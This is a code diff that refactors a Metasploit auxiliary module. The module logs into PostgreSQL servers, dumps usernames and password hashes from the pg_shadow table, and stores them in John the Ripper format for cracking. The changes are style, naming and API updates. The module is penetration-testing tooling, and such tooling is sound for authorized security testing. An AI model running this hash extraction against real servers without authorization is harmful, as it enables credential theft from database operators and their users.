@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Postgres
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -32,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
 
-    #Query the Postgres Shadow table for username and password hashes and report them
+    # Query the Postgres Shadow table for username and password hashes and report them
     res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
 
     service_data = {
@@ -55,10 +50,10 @@ class Metasploit3 < Msf::Auxiliary
 
     credential_data.merge!(service_data)
 
-    #Error handling routine here, borrowed heavily from todb
+    # Error handling routine here, borrowed heavily from todb
     case res.keys[0]
     when :conn_error
-      print_error("A Connection Error occured")
+      print_error("A Connection Error Occurred")
       return
     when :sql_error
       # We know the credentials worked but something else went wrong
@@ -90,11 +85,11 @@ class Metasploit3 < Msf::Auxiliary
       # We know the credentials worked and have admin access because we got the hashes
       login_data[:access_level] = 'Admin'
       create_credential_login(login_data)
-      print_status("Query appears to have run successfully")
+      print_good("Query appears to have run successfully")
     end
 
 
-    tbl = Rex::Ui::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => 'Postgres Server Hashes',
       'Indent'   => 1,
       'Columns' => ['Username', 'Hash']
@@ -112,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
         origin_type: :service,
         jtr_format: 'raw-md5,postgres',
         module_fullname: self.fullname,
-        private_type: :nonreplayable_hash
+        private_type: :postgres_md5
     }
 
     credential_data.merge!(service_data)
@@ -122,7 +117,6 @@ class Metasploit3 < Msf::Auxiliary
       next if row[0].nil? or row[1].nil?
       next if row[0].empty? or row[1].empty?
       password = row[1]
-      password.slice!(0,3)
 
       credential_data[:username]     = row[0]
       credential_data[:private_data] = password
@@ -140,7 +134,5 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{tbl.to_s}")
 
   end
-
-
 
 end
